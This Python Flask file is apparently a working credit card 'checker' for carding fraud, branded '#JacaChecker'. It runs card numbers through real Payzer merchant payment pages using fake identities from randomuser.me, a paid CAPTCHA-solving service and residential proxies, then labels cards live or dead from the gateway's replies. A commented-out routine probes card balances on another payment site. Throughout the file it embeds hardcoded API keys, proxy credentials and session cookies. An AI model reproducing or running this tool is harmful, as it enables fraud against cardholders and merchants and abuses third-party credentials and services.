import csv
import json
from flask import Flask, request, render_template, jsonify
from flask_cors import CORS
import os
import http.client
import threading, requests, random, time, random, re
from urllib3 import disable_warnings
from colorama import Fore


disable_warnings()


app = Flask(__name__)

CORS(app)
    
def pegarItem(data, esquerda, direita):
    return data.partition(esquerda)[-1].partition(direita)[0]


def criarTask():
    key = rkey()
    data = {
        "clientKey": "409154ed879c9e41c25703a6f92289bd",
        "task": {
            "type": "RecaptchaV2TaskProxyless",
            "websiteURL": f"https://www.payzer.com/Payment/ExternalMake/businessId/{key}",
            "websiteKey": "6LdRqCATAAAAAEtlufJFRFSgqjZeCRCKW978YHB5",
        },
    }
    criar = requests.post(
        "https://api.capmonster.cloud/createTask", verify=False, json=data
    )
    taskId = criar.json()["taskId"]
    while True:
        data = {"clientKey": "409154ed879c9e41c25703a6f92289bd", "taskId": taskId}
        resultado = requests.post(
            "https://api.capmonster.cloud/getTaskResult", verify=False, json=data
        )
        print(resultado.text)
        if '"status":"ready"' in resultado.text:
            return resultado.json()["solution"]["gRecaptchaResponse"]
        time.sleep(1)


# def Saldo():
#     data = {
#         "clientKey": "409154ed879c9e41c25703a6f92289bd",
#         "task": {
#             "type": "RecaptchaV2EnterpriseTask",
#             "websiteURL": "https://www.eduwhere.com/secure/autopay_confirm.php",
#             "websiteKey": "6LfFHhQUAAAAAFFMGjELVU4DwN8oDECRFp1nCupe",
#         },
#     }
#     criar = requests.post(
#         "https://api.capmonster.cloud/createTask", verify=False, json=data
#     )
#     taskId = criar.json()["taskId"]
#     while True:
#         data = {"clientKey": "409154ed879c9e41c25703a6f92289bd", "taskId": taskId}
#         resultado = requests.post(
#             "https://api.capmonster.cloud/getTaskResult", verify=False, json=data
#         )
#         print(resultado.text)
#         if '"status":"ready"' in resultado.text:
#             return resultado.json()["solution"]["gRecaptchaResponse"]
#         time.sleep(1)
        
        
def api_bin(bin):
    try:
        req = requests.get(
            f"https://parrotv2.prod.pagosapi.com/cards?bin={bin}",
            headers={"x-api-key": "fe8d6db2967a4e77b4d7268448897c95"},
            verify=False,
        )
        if req.status_code == 200:
            try:
                tipo = req.json()["card"]["type"]
                nivel = req.json()["card"]["product"]["product_name"]
                banco = req.json()["card"]["bank"]["name"]
                try:
                    pais = req.json()["card"]["country"]["name"]
                except:
                    pais = "N/A"
                return f"{nivel} {tipo} {banco} {pais}".upper()
            except:
                return "SEM INFORMAÇÃO DA BIN"
        else:
            return "SEM INFORMAÇÃO DA BIN"
    except:
        return "SEM INFORMAÇÃO DA BIN"
    

class RequisicaoException(Exception):
    def __init__(self):
        super().__init__()
        
class RequisicaoException2(Exception):
    def __init__(self):
        super().__init__()


def reteste(card, month, year, cvv):
        checker(card, month, year, cvv)

keys = ["10" ,"4" ,"35" ,"57" ,"98" ,"112" ,"142" ,"155" ,"178" ,"173" ,"184" ,"199" ,"262" ,"273" ,"301" ,"313" ,"344" ,"372" ,"376" ,"416" ,"498" ,"518" ,"552" ,"509" ,"570" ,"582" ,"586" ,"583" ,"585" ,"603" ,"648" ,"643" ,"677" ,"696" ,"692" ,"704" ,"733" ,"797" ,"829" ,"885" ,"896" ,"894" ,"903" ,"915" ,"1044" ,"1056" ,"1084" ,"1090" ,"1108" ,"1136" ,"1141" ,"1142" ,"1144" ,"1145" ,"1159" ,"1189" ,"1212" ,"1209" ,"1254" ,"1281" ,"1288" ,"1289" ,"1304" ,"1282" ,"1316" ,"1345" ,"1364" ,"1372" ,"1384" ,"1409" ,"1412" ,"1411" ,"1418" ,"1419" ,"1430" ,"1431" ,"1445" ,"1446" ,"1459" ,"1463" ,"1469" ,"1511" ,"1536" ,"1538" ,"1556" ,"1587" ,"1619" ,"1636" ,"1708" ,"1718" ,"1732" ,"1758" ,"1762" ,"1815" ,"1842" ,"1862" ,"1875" ,"1872" ,"1890" ,"1915" ,"1914" ,"1924" ,"1932" ,"1947" ,"2012" ,"2076" ,"2088" ,"2090" ,"2094" ,"2111" ,"2122" ,"2138" ,"2158" ,"2156" ,"2168" ,"2181" ,"2184" ,"2206" ,"2202" ,"2223" ,"2235" ,"2252" ,"2293" ,"2305" ,"2298" ,"2312" ,"2363" ,"2353" ,"2384" ,"2388" ,"2389" ,"2399" ,"2443" ,"2449" ,"2498" ,"2493" ,"2541" ,"2548" ,"2547" ,"2566" ,"2591" ,"2587" ,"2633" ,"2646" ,"2651" ,"2657" ,"2681" ,"2678" ,"2696" ,"2718" ,"2731" ,"2741" ,"2773" ,"2824" ,"2852" ,"2917" ,"2941" ,"2948" ,"2956" ,"3012" ,"3019" ,"3021" ,"3034" ,"3049" ,"3056" ,"3053" ,"3072" ,"3073" ,"3077" ,"3088" ,"3147" ,"3192" ,"3210" ,"3224" ,"3227" ,"3257" ,"3331" ,"3357" ,"3368" ,"3398" ,"3418" ,"3430" ,"3449" ,"3458" ,"3467" ,"3463" ,"3483" ,"3515" ,"3600" ,"3610" ,"3622" ,"3654" ,"3649" ,"3680" ,"3700" ,"3716" ,"3743" ,"3738" ,"3744" ,"3754" ,"3778" ,"3782" ,"3793" ,"3824" ,"3818" ,"3841" ,"3843" ,"3933" ,"3969" ,"3982" ,"4000" ,"4017" ,"4055" ,"4073" ,"4088" ,"4122" ,"4129" ,"4174" ,"4200" ,"4206" ,"4219" ,"4226" ,"4246" ,"4271" ,"4274" ,"4280" ,"4286" ,"4281" ,"4313" ,"4322" ,"4364" ,"4382" ,"4405" ,"4444" ,"4466" ,"4522" ,"4532" ,"4556" ,"4597" ,"4606" ,"4628" ,"4640" ,"4692" ,"4727" ,"4742" ,"4784" ,"4826" ,"4831" ,"4830" ,"4859" ,"4881" ,"4886" ,"4899" ,"4915" ,"4955" ,"4963" ,"4966" ,"4969" ,"5042" ,"5031" ,"5089" ,"5087" ,"5123" ,"5153" ,"5159" ,"5179" ,"5202" ,"5220" ,"5245" ,"5250" ,"5258" ,"5281" ,"5311" ,"5313" ,"5354" ,"5391" ,"5415" ,"5424" ,"5427" ,"5464" ,"5490" ,"5510" ,"5499" ,"5519" ,"5533" ,"5545" ,"5566" ,"5569" ,"5573" ,"5597" ,"5607" ,"5642" ,"5650" ,"5652" ,"5666" ,"5683" ,"5693" ,"5711" ,"5715" ,"5788" ,"5793" ,"5812" ,"5810" ,"5852" ,"5884" ,"5896" ,"5906" ,"5942" ,"5949" ,"5961" ,"6009" ,"6002" ,"6027" ,"6067" ,"6087" ,"6125" ,"6184" ,"6186" ,"6192" ,"6203" ,"6207" ,"6218" ,"6215" ,"6269" ,"6310" ,"6338" ,"6359" ,"6386" ,"6385" ,"6404" ,"6408" ,"6442" ,"6448" ,"6452" ,"6453" ,"6478" ,"6495" ,"6523" ,"6530" ,"6537" ,"6540" ,"6536" ,"6619" ,"6652" ,"6657" ,"6676" ,"6752" ,"6760" ,"6783" ,"6779" ,"6803" ,"6811" ,"6814" ,"6847" ,"6874" ,"6875" ,"6878" ,"6879" ,"6903" ,"6928" ,"6931" ,"6938" ,"6985" ,"7036" ,"7096" ,"7110" ,"7124" ,"7301" ,"7306" ,"7405" ,"7421" ,"7439" ,"7445" ,"7525" ,"7542" ,"7557" ,"7587" ,"7588" ,"7602" ,"7675" ,"7674" ,"7715" ,"7724" ,"7727" ,"7743" ,"7737" ,"7752" ,"7771" ,"7795" ,"7815" ,"7817" ,"7835" ,"7837" ,"7867" ,"7898" ,"7921" ,"7936" ,"7980" ,"7998" ,"8009" ,"8042" ,"8068" ,"8074" ,"8093" ,"8105" ,"8111" ,"8116" ,"8128" ,"8134" ,"8171" ,"8187" ,"8185" ,"8198" ,"8201" ,"8221" ,"8225" ,"8251" ,"8248" ,"8264" ,"8270" ,"8290" ,"8303" ,"8328" ,"8334" ,"8333" ,"8361" ,"8364" ,"8397" ,"8406" ,"8412" ,"8428" ,"8457" ,"8500" ,"8520" ,"8537" ,"8566" ,"8571" ,"8583" ,"8610" ,"8636" ,"8643" ,"8665" ,"8672" ,"8715" ,"8729" ,"8743" ,"8757" ,"8772" ,"8779" ,"8789" ,"8839" ,"8845" ,"8853" ,"8890" ,"8899" ,"8934" ,"8943" ,"8954" ,"8955" ,"8978" ,"8984" ,"8991" ,"9001" ,"9028" ,"9040" ,"9045" ,"9058" ,"9102" ,"9121" ,"9159" ,"9175" ,"9198" ,"9199" ,"9183" ,"9229" ,"9241" ,"9249" ,"9256" ,"9260" ,"9270" ,"9274" ,"9378" ,"9469" ,"9482" ,"9483" ,"9509" ,"9532" ,"9547" ,"9592" ,"9619" ,"9655" ,"9684" ,"9712" ,"9705" ,"9707" ,"9734" ,"9807" ,"9821" ,"9833" ,"9837" ,"9842" ,"9840" ,"9845" ,"9841" ,"9867" ,"9866" ,"9869" ,"9852" ,"9871" ,"9873" ,"9874" ,"9879" ,"9881" ,"9885" ,"9887" ,"9890" ,"9940" ,"9942" ,"9950" ,"9956" ,"9966" ,"9984" ,"9987" ,"9995"]

def rkey():
    return random.choice(keys)


def definir_tipo_cartao(card):
    if card.startswith("4"):
        return "VISA"
    elif card.startswith(("51", "52", "53", "54", "55")):
        return "MASTER"
    elif card.startswith(("34", "37")):
        return "American Express"
    elif card.startswith("6"):
        return "Discover"
    else:
        return "Desconhecido"
    
# def retesteSaldo(card, month, year, cvv):
#         saldo(card, month, year, cvv)
        
# def saldo(card, month, year, cvv):
#         try:    
        
#             url = "https://randomuser.me/api?results=1&gender=&password=upper,lower,12&exc=register,picture,id&nat=US"
#             headers = {
#                     'Host': 'randomuser.me',
#                     'sec-ch-ua': '"Chromium";v="118", "Google Chrome";v="118", "Not=A?Brand";v="99"',
#                     'accept': 'application/json, text/plain, */*',
#                     'sec-ch-ua-mobile': '?0',
#                     'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36',
#                     'sec-ch-ua-platform': '"Windows"',
#                     'origin': 'https://namso-gen.com',
#                     'sec-fetch-site': 'cross-site',
#                     'sec-fetch-mode': 'cors',
#                     'sec-fetch-dest': 'empty',
#                     'referer': 'https://namso-gen.com/',
#                     'accept-language': 'pt-PT,pt;q=0.9,en-US;q=0.8,en;q=0.7'
#                     }

#             response = requests.get( url, headers=headers, verify=False)
#             email = pegarItem(response.text, '"email":"','"')
#             nome = pegarItem(response.text, '"first":"','"')
#             sobrenome = pegarItem(response.text, '"last":"','"')
#             street = pegarItem(response.text, '"name":"','"},"city"')
#             snumber = pegarItem(response.text, '"street":{"number":',',')
#             city = pegarItem(response.text, '"city":"','"')
#             state = pegarItem(response.text, '"state":"','"')
#             state = state[0:2].upper()
#             postcode = pegarItem(response.text, '"postcode":',',')
#             company = pegarItem(response.text, '"username":"','"')
#             tel = random.randint(1111,9999)
#             tel2 = random.randint(111,999)
#             tel3 = random.randint(111,999)
#             recap = Saldo()
            
#             if len(year) == 4:
#                 year = year[2:]
                
#             url = "https://www.eduwhere.com/secure/autopay_confirm.php"
#             payload = f"pigID=nada&ssl_invoice_number=nadaPnada&ssl_amount=11&invnbr={tel}{tel2}&user_message=+&cctype=VISA&ssl_card_number={card}&exp_date_month={month}&exp_date_year={year}&ssl_cvv2cvc2=232&ssl_first_name={nome}&ssl_last_name={sobrenome}&ssl_company=MR&ssl_avs_address={snumber}+{street}&ssl_address2=&ssl_city={city}&ssl_state={state}&ssl_avs_zip={postcode}&billcountry=United+States&ap_ponumber=&g-recaptcha-response={recap}"
#             headers = {
#                 'Host': 'www.eduwhere.com',
#                 'content-type': 'application/x-www-form-urlencoded',
#                 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
#                 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
#                 }
#             response = requests.request("POST", url, headers=headers, data=payload, verify=False, allow_redirects=False)
#             if 'ssl_account_balance' in response.text:
#                 dolar = pegarItem(response.text, '&amp;ssl_account_balance=','&')
#                 return dolar
 
            
            
#         except requests.exceptions.ProxyError:
#             print(Fore.LIGHTWHITE_EX + f"RETESTANDO PROXY: {card}|{month}|{year}|{cvv}")
#             retesteSaldo(card, month, year, cvv)
#         except requests.exceptions.ConnectionError:
#             print(Fore.LIGHTWHITE_EX + f"RETESTANDO ConnectionError: {card}|{month}|{year}|{cvv}")
#             retesteSaldo(card, month, year, cvv)
#         except requests.exceptions.RequestException:
#             print(Fore.LIGHTWHITE_EX + f"RETESTANDO RequestException: {card}|{month}|{year}|{cvv}")
#             retesteSaldo(card, month, year, cvv)
    
time.sleep(2)
def checker(card, month, year, cvv):
    try:
        url = "https://randomuser.me/api?results=1&gender=&password=upper,lower,12&exc=register,picture,id&nat=US"
        headers = {
                'Host': 'randomuser.me',
                'sec-ch-ua': '"Chromium";v="118", "Google Chrome";v="118", "Not=A?Brand";v="99"',
                'accept': 'application/json, text/plain, */*',
                'sec-ch-ua-mobile': '?0',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36',
                'sec-ch-ua-platform': '"Windows"',
                'origin': 'https://namso-gen.com',
                'sec-fetch-site': 'cross-site',
                'sec-fetch-mode': 'cors',
                'sec-fetch-dest': 'empty',
                'referer': 'https://namso-gen.com/',
                'accept-language': 'pt-PT,pt;q=0.9,en-US;q=0.8,en;q=0.7'
                }

        response = requests.get( url, headers=headers, verify=False)
        email = pegarItem(response.text, '"email":"','"')
        nome = pegarItem(response.text, '"first":"','"')
        sobrenome = pegarItem(response.text, '"last":"','"')
        street = pegarItem(response.text, '"name":"','"},"city"')
        snumber = pegarItem(response.text, '"street":{"number":',',')
        city = pegarItem(response.text, '"city":"','"')
        state = pegarItem(response.text, '"state":"','"')
        state = state[0:2].upper()
        postcode = pegarItem(response.text, '"postcode":',',')
        company = pegarItem(response.text, '"username":"','"')
        tel = random.randint(1111,9999)
        tel2 = random.randint(111,999)
        tel3 = random.randint(111,999)
        
        
        if response.status_code == 200:
            p = {'https': 'http://brd-customer-hl_b12cf4ef-zone-rdpremium-country-us:qj77tznsi49h@brd.superproxy.io:22225', 'http':'http://brd-customer-hl_b12cf4ef-zone-rdpremium-country-us:qj77tznsi49h@brd.superproxy.io:22225'}
            start_time = time.time() 
            key = rkey()
            url = f"https://www.payzer.com/Payment/ExternalMake/businessId/{key}"
            payload = {}
            headers = {
                'Host': 'www.payzer.com',
                'Cookie': 'PHPSESSID=jb64fndpm5n22f9je0kqleo5tsoa0nft; _gid=GA1.2.778086094.1713968828; _ga=GA1.1.1393613120.1713968828; _ga_4XLYQDPHZ2=GS1.1.1713968827.1.1.1713968985.60.0.0',
                'sec-ch-ua': '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'upgrade-insecure-requests': '1',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'sec-fetch-site': 'none',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-user': '?1',
                'sec-fetch-dest': 'document',
                'accept-language': 'pt-PT,pt;q=0.9,en-US;q=0.8,en;q=0.7',
                'priority': 'u=0, i'
                }
            response = requests.request("GET", url, headers=headers, data=payload, verify=False, allow_redirects=False, proxies=p)
            time.sleep(2)
            
            
            if 'location' in response.headers:
                loocation = response.headers.get('location')


            url = f"https://www.payzer.com{loocation}"

            payload = {}
            headers = {
                'Host': 'www.payzer.com',
                'Cookie': 'PHPSESSID=jb64fndpm5n22f9je0kqleo5tsoa0nft; _gid=GA1.2.778086094.1713968828; _ga=GA1.1.1393613120.1713968828; _ga_4XLYQDPHZ2=GS1.1.1713968827.1.1.1713968985.60.0.0; viewStyle=zend; outageMessageSeen=1',
                'upgrade-insecure-requests': '1',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'sec-fetch-site': 'none',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-user': '?1',
                'sec-fetch-dest': 'document',
                'sec-ch-ua': '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'accept-language': 'pt-PT,pt;q=0.9,en-US;q=0.8,en;q=0.7',
                'priority': 'u=0, i'
                }
            response = requests.request("GET", url, headers=headers, data=payload, verify=False, proxies=p, allow_redirects=False)
            
            time.sleep(2)
            
            if  response.status_code == 302:
                print(response.text)
                raise RequisicaoException() 
            pm = pegarItem(response.text, 'name="nt" value="','"')
            
            
            amount = random.randint(800, 900)
            recap = criarTask()
            url = f"https://www.payzer.com/Payment/ExternalMake/nt/{pm}"
            payload = {
                'nt':	pm,
                'businessId':	key,
                'businessCustomerId': '',	
                'faid':	'',
                'FirstName':	nome,
                'LastName':	sobrenome,
                'Email':	email,
                'mobilePhone':	f'({tel2}) {tel3}-{tel}',
                'Amount':	f'$ {amount}.00',
                'Memo':	'',
                'PaymentMethod':	'card',
                'CardNumber':	card,
                'ExpirationMonth':	month,
                'ExpirationYear':	year,
                'Cvv':	cvv,
                'BillingZip':	postcode,
                'AchAccountHolderType':	'',
                'AchAccountType':	'',
                'InvoiceNumber': f'{tel3}{tel}',
                'AchNameOnAccount':	'',
                'achSameName':	'N',
                'RoutingNumber':	'',
                'AccountNumber':	'',
                'VerifyAccountNumber':	'',
                'g-recaptcha-response':	f'{recap}',
                'next':	'next'
            }
            headers = {
                'Host': 'www.payzer.com',
                'Cookie': 'PHPSESSID=jb64fndpm5n22f9je0kqleo5tsoa0nft; _gid=GA1.2.778086094.1713968828; viewStyle=zend; outageMessageSeen=1; _ga_4XLYQDPHZ2=GS1.1.1714002983.2.0.1714002983.60.0.0; _ga=GA1.2.1393613120.1713968828; _gat_gtag_UA_111485301_1=1',
                'cache-control': 'max-age=0',
                'sec-ch-ua': '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'upgrade-insecure-requests': '1',
                'origin': 'https://www.payzer.com',
                'content-type': 'application/x-www-form-urlencoded',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-user': '?1',
                'sec-fetch-dest': 'document',
                'referer': f'https://www.payzer.com/Payment/ExternalMake/nt/{pm}',
                'accept-language': 'pt-PT,pt;q=0.9,en-US;q=0.8,en;q=0.7',
                'priority': 'u=0, i'
                }
            response = requests.request("POST", url, headers=headers, data=payload, verify=False, allow_redirects=False, proxies=p)
            
            time.sleep(2)
            
            
            if 'location' in response.headers:
                loocation = response.headers.get('location')          
                               
                url = f"https://www.payzer.com{loocation}"
                payload = {}
                headers = {
                'Host': 'www.payzer.com',
                'Cookie': 'PHPSESSID=jb64fndpm5n22f9je0kqleo5tsoa0nft; _gid=GA1.2.778086094.1713968828; viewStyle=zend; outageMessageSeen=1; _ga_4XLYQDPHZ2=GS1.1.1714002983.2.0.1714002983.60.0.0; _ga=GA1.2.1393613120.1713968828; _gat_gtag_UA_111485301_1=1',
                'cache-control': 'max-age=0',
                'upgrade-insecure-requests': '1',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-user': '?1',
                'sec-fetch-dest': 'document',
                'sec-ch-ua': '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'referer': f'https://www.payzer.com/Payment/ExternalMake/nt/{pm}',
                'accept-language': 'pt-PT,pt;q=0.9,en-US;q=0.8,en;q=0.7',
                'priority': 'u=0, i'
                }
                response = requests.request("GET", url, headers=headers, data=payload, verify=False, proxies=p)
                

                url = f"https://www.payzer.com/Payment/ExternalConfirmPayment/nt/{pm}"
                payload = f"https://www.payzer.com/Payment/ExternalConfirmPayment/nt/{pm}"
                headers = {
                    'Host': 'www.payzer.com',
                    'Cookie': 'PHPSESSID=jb64fndpm5n22f9je0kqleo5tsoa0nft; _gid=GA1.2.778086094.1713968828; viewStyle=zend; outageMessageSeen=1; _gat_gtag_UA_111485301_1=1; _ga_4XLYQDPHZ2=GS1.1.1714002983.2.1.1714002999.44.0.0; _ga=GA1.1.1393613120.1713968828',
                    'cache-control': 'max-age=0',
                    'sec-ch-ua': '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '"Windows"',
                    'upgrade-insecure-requests': '1',
                    'origin': 'https://www.payzer.com',
                    'content-type': 'application/x-www-form-urlencoded',
                    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
                    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                    'sec-fetch-site': 'same-origin',
                    'sec-fetch-mode': 'navigate',
                    'sec-fetch-user': '?1',
                    'sec-fetch-dest': 'document',
                    'referer': f'https://www.payzer.com/Payment/ExternalConfirmPayment/nt/{pm}',
                    'accept-language': 'pt-PT,pt;q=0.9,en-US;q=0.8,en;q=0.7',
                    'priority': 'u=0, i'
                    }
                response = requests.request("POST", url, headers=headers, data=payload, verify=False, proxies=p)
                
                
                if 'getSelectedFinancingProduct' in response.text:
                    raise RequisicaoException2()
                
                #time.sleep(2)
                elapsed_time = time.time() - start_time
                MSegundos = round(elapsed_time, 2)
                

                if 'Zip Code mismatch' in response.text:
                    # dolar = saldo(card, month, year, cvv)
                    bin = api_bin(card[:6])              
                    x = f"{card}|{month}|{year}|{cvv}| {bin} - Status: AVS"                          
                    #open("everettweb.txt", "a").write(f"Live: {card} {month} {year} {cvv} {bin} NSF [{MSegundos}] #JacaChecker\n") 
                    print(Fore.GREEN + f"{x} #JacaChecker") 
                    return {"code": 0, "mensagem": f"{x} #JacaChecker<br>"}
                    
                elif 'Please retry' in response.text:
                    # dolar = saldo(card, month, year, cvv)
                    bin = api_bin(card[:6])              
                    x = f"{card}|{month}|{year}|{cvv}| {bin} - Status: Retry 19"                    
                    #pen("everettweb.txt", "a").write(f"Live: {card} {month} {year} {cvv} {bin} Retry 19 [{MSegundos}] #JacaChecker\n") 
                    print(Fore.GREEN + f"{x} #JacaChecker") 
                    return {"code": 0, "mensagem": f"{x} #JacaChecker<br>"}
                        
                elif 'error' in response.text:  
                    msg = pegarItem(response.text, 'reason: ','<')
                    bin = api_bin(card[:6])
                    x = f"{card}|{month}|{year}|{cvv}| {bin} - Status: {msg}"     
                    print(Fore.RED + f"{x} #JacaChecker")  
                    return {"code": 2, "mensagem": f"{x} #JacaChecker<br>"}  
                                            

                    
                else:
                    
                    print(Fore.RED + 'Gateway Timeout' + response.text)
                    return {"code": 2, "mensagem": f"Gateway Timeout #JacaChecker<br>"}
                
            else:
                print(Fore.LIGHTBLUE_EX + f"RETESTANDO: {card, month, year, cvv} #JacaChecker") 
                reteste(card, month, year, cvv)


            
    except requests.exceptions.ProxyError:
        print(Fore.LIGHTWHITE_EX + f"RETESTANDO PROXY: {card}|{month}|{year}|{cvv}")
        #reteste(card, month, year, cvv)
        
    except requests.exceptions.ConnectionError:
        print(Fore.LIGHTWHITE_EX + f"RETESTANDO ConnectionError: {card}|{month}|{year}|{cvv}")
        #reteste(card, month, year, cvv)
    except requests.exceptions.RequestException:
        print(Fore.LIGHTWHITE_EX + f"RETESTANDO RequestException: {card}|{month}|{year}|{cvv}")
        #reteste(card, month, year, cvv)
    except RequisicaoException:
        print(Fore.LIGHTWHITE_EX + f"Bad Request ({key}): {card}|{month}|{year}|{cvv}")
        #reteste(card, month, year, cvv)
    except RequisicaoException2:
        print(Fore.LIGHTWHITE_EX + f"Final Error ({key}): {card}|{month}|{year}|{cvv}")
        #reteste(card, month, year, cvv)
            


def processar_cartoes(card,mes,ano,cvv):
    try:
        if len(card) == 16 or len(card) == 15 and mes and ano and cvv:
            retorno = checker(card,mes,ano,cvv)
            return {"code": retorno["code"], "retorno": retorno["mensagem"]}
        else:
            return {"code": "", "retorno": "erro no formulario"}
    except:
        #retorno = reteste(card,mes,ano,cvv)
        return {"code": "", "retorno": "Exception !"}
    
    

            
            
@app.route('/', methods=['GET'])
def iniciarChk():
    return "@Engenieiro"


@app.route('/chk', methods=['GET'])
def chk():
    args = request.args
    print(args)
    card = args.get('card')
    mes = args.get('mes')
    ano = args.get('ano')
    cvv = args.get('cvv')
    return jsonify(processar_cartoes(card,mes,ano,cvv))



if __name__ == '__main__':
    app.run(host='localhost', port=5000, debug=True)
    
    
    
    

